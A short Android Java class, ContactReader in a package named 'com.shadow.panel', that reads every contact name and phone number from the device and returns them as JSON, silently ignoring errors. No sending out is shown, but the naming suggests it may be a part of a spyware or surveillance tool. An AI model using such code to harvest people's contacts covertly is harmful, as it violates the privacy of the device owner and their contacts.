package com.shadow.panel;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONObject;
public class ContactReader {
    public static JSONArray dump(Context ctx) {
        JSONArray arr = new JSONArray();
        try (Cursor c = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null)) {
            if (c == null) return arr;
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("name", c.getString(0));
                o.put("number", c.getString(1));
                arr.put(o);
            }
        } catch (Exception ignored) {}
        return arr;
    }
}
